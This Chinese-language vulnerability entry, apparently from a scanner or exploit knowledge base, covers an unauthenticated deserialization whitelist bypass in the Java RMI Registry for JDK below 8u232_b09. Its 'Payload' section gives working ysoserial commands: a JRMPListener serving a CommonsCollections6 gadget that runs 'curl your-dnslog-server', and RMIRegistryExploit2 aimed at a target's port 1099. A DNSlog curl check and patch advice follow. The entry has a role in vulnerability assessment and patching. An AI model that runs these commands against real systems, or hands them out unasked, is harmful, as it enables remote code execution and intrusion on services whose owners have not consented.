---
id: JAVA-RMI-REGISTRY-BIND-DESERIALIZATION-BYPASS
title: Java RMI Registry 反序列化绕过漏洞
product: java
vendor: Oracle
version_affected: "<JDK 8u232_b09"
severity: CRITICAL
tags: [rce, deserialization, rmi, 无需认证]
fingerprint: ["Java RMI", "RMI Registry"]
---

## 漏洞描述

JDK 8u121 起 RMI Registry 实施了反序列化白名单限制。该漏洞通过白名单类中的可利用类绕过限制，继续实现 RCE。

## 影响版本

- JDK < 8u232_b09

## 前置条件

- 无需认证
- 可访问 RMI Registry 端口（默认 1099）

## 利用步骤

1. 使用 ysoserial 的 RMIRegistryExploit2 或 RMIRegistryExploit3 发起攻击
2. 使用 JRMPListener 配合绕过白名单

## Payload

```bash
# 启动 JRMPListener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl your-dnslog-server"

# 发起攻击
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit2 <target_ip> 1099 jrmphost 8888
```

## 验证方法

```bash
# 检查命令是否执行
curl http://your-dnslog-server  # 检查 DNS 或 HTTP 请求
```

## 修复建议

1. 升级 JDK 至 8u232_b09+
2. 启用 RMI Registry 认证
3. 禁用不必要的 RMI 服务
